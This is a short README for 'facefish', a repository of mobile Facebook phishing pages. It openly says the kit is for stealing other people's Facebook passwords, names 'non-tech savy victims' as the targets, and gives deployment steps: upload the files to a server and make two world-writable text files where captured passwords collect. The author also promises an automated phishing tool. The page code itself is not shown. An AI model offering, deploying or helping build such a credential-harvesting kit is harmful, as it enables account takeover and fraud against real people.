# facefish

Hi guys !
Let me tell you something about facefish.

This project includes collection of facebook phishing pages that you can use to steal facebook passwords of others. This is really simple to use and probably works with 'non-tech savy victims'.

This phishing pages are really built for mobile devices and it won't go good with desktop and tablet devices.

# Usage

* Upload all files to the server
* Give all permissons to newpass.txt and oldpass.txt
  *chmod 777 newpass.txt oldpass.txt

You will get sniffed passwords in oldpass.txt and newpass.txt

I know that this is not an awesome project , but I am continuing with this project and will come up with a automated phishing tool in python soon. So stay tuned
